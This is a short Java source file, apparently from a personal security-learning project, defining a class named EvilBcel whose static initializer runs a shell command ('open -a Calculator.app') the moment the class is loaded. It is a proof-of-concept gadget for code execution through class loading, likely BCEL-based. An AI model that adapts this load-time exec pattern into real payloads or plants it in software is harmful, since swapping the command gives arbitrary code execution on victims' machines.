package com.xjjlearning.hack.java.classloader.bytecodes;

import java.io.IOException;

/**
 * created by xjj on 2023/1/31
 */
public class EvilBcel {
    static {
        try {
            Runtime.getRuntime().exec("open -a Calculator.app");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
